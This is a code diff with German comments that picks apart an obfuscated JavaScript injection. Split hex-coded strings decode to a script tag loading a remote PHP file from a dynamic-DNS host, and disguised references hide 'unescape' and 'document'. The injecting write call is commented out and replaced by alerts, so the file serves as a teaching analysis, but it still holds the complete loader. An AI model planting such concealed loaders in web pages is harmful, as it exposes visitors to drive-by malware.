@@ -1,0 +1,74 @@
+<script type="text/javascript">
+
+// mehrfach codiertes JavaScript in mehreren Zeichenketten-Teilen
+// Auffälligkeit: bestehend aus Gruppe "N8qqg{?}{?}" !!!
+var p3e0918EEt6CIDI		=	"N8qqg21N8qqg23";
+var dmiJZ4Kh3ZagCDp0	=	"N8qqg3cN8qqg73N8qqg63N8qqg72N8qqg69"; 
+// wird später zu 		: 	"%3c%73%63%72%69"... 
+var dmiJZ4Kh3ZagCDp1	=	"N8qqg70N8qqg74N8qqg20N8qqg74N8qqg79"; 
+var dmiJZ4Kh3ZagCDp2	=	"N8qqg70N8qqg65N8qqg3dN8qqg22N8qqg74"; 
+var dmiJZ4Kh3ZagCDp3	=	"N8qqg65N8qqg78N8qqg74N8qqg2fN8qqg6a"; 
+var dmiJZ4Kh3ZagCDp4	=	"N8qqg61N8qqg76N8qqg61N8qqg73N8qqg63"; 
+var dmiJZ4Kh3ZagCDp5	=	"N8qqg72N8qqg69N8qqg70N8qqg74N8qqg22"; 
+var dmiJZ4Kh3ZagCDp6	=	"N8qqg20N8qqg73N8qqg72N8qqg63N8qqg3d"; 
+var dmiJZ4Kh3ZagCDp7	=	"N8qqg22N8qqg68N8qqg74N8qqg74N8qqg70"; 
+var dmiJZ4Kh3ZagCDp8	=	"N8qqg3aN8qqg2fN8qqg2fN8qqg72N8qqg62"; 
+var dmiJZ4Kh3ZagCDp9	=	"N8qqg75N8qqg73N8qqg69N8qqg6eN8qqg65"; 
+var dmiJZ4Kh3ZagCDp10	=	"N8qqg73N8qqg73N8qqg2eN8qqg73N8qqg65"; 
+var dmiJZ4Kh3ZagCDp11	=	"N8qqg72N8qqg76N8qqg65N8qqg68N8qqg74"; 
+var dmiJZ4Kh3ZagCDp12	=	"N8qqg74N8qqg70N8qqg2eN8qqg63N8qqg6f"; 
+var dmiJZ4Kh3ZagCDp13	=	"N8qqg6dN8qqg2fN8qqg2fN8qqg6dN8qqg6c"; 
+var dmiJZ4Kh3ZagCDp14	=	"N8qqg2eN8qqg70N8qqg68N8qqg70N8qqg22"; 
+var dmiJZ4Kh3ZagCDp15	=	"N8qqg3eN8qqg20N8qqg3cN8qqg2fN8qqg73"; 
+var dmiJZ4Kh3ZagCDp16	=	"N8qqg63N8qqg72N8qqg69N8qqg70N8qqg74"; 
+var dmiJZ4Kh3ZagCDp17	=	"N8qqg3e";
+var FTNna0NdpizMzaH		=	"dlsv421N8qqg23";
+
+// verbindet das Obere alles zu einer laaaaaangen Zeitenkette
+var TE8733ylspUNTrt		=	dmiJZ4Kh3ZagCDp0
+							+dmiJZ4Kh3ZagCDp1
+							+dmiJZ4Kh3ZagCDp2
+							+dmiJZ4Kh3ZagCDp3
+							+dmiJZ4Kh3ZagCDp4
+							+dmiJZ4Kh3ZagCDp5
+							+dmiJZ4Kh3ZagCDp6
+							+dmiJZ4Kh3ZagCDp7
+							+dmiJZ4Kh3ZagCDp8
+							+dmiJZ4Kh3ZagCDp9
+							+dmiJZ4Kh3ZagCDp10
+							+dmiJZ4Kh3ZagCDp11
+							+dmiJZ4Kh3ZagCDp12
+							+dmiJZ4Kh3ZagCDp13
+							+dmiJZ4Kh3ZagCDp14
+							+dmiJZ4Kh3ZagCDp15
+							+dmiJZ4Kh3ZagCDp16
+							+dmiJZ4Kh3ZagCDp17;
+							
+// tauscht in der laaaaaagen Zeichenkette alle 	"N8qqg" gegen ein "%"-Zeichen aus: daraus entsteht dann eine URL_ENCODED Zeichenkette !!!!!!!
+// siehe auch:	http://de.selfhtml.org/javascript/objekte/unabhaengig.htm#unescape
+//				http://de.selfhtml.org/javascript/objekte/unabhaengig.htm#decode_uri
+//				http://de.selfhtml.org/javascript/objekte/unabhaengig.htm#encode_uri
+//				http://de3.php.net/manual/de/function.urldecode.php
+//				http://de3.php.net/manual/de/function.urlencode.php
+kjf74EANwCxWs0k			=	TE8733ylspUNTrt.replace(/N8qqg/g,"%");
+
+// boah-ey, zeig mal ;)
+alert ( kjf74EANwCxWs0k );
+
+// verschleiert die JavaScript Funktion "unescape" um ihren Aufruf schwerer zu erkennen !
+var Ajypp1rnljdG878		=	unescape;
+var p3e0918EEt6CIDI		=	"kqgKO21dlsv423";
+
+// verschleiert das "window.document" Objekt
+q9124					=	this;
+var GUrfavukIqwFNpP		=	q9124["WYd1GoGYc2uG1mYGe2YnltY".replace(/[Y12WlG\:]/g, "")];
+//                                   ^  ^  ^ ^  ^  ^  ^ ^
+//                                   d  o  c u  m  e  n t
+
+// ruft die verschleierten Funktionen auf, schreibt und führt den verschlüsselten Code von oben aus...
+// GUrfavukIqwFNpP.write( Ajypp1rnljdG878( kjf74EANwCxWs0k ) );
+
+// boah-ey, zeig mal ;)
+alert ( Ajypp1rnljdG878( kjf74EANwCxWs0k ) );
+
+</script>
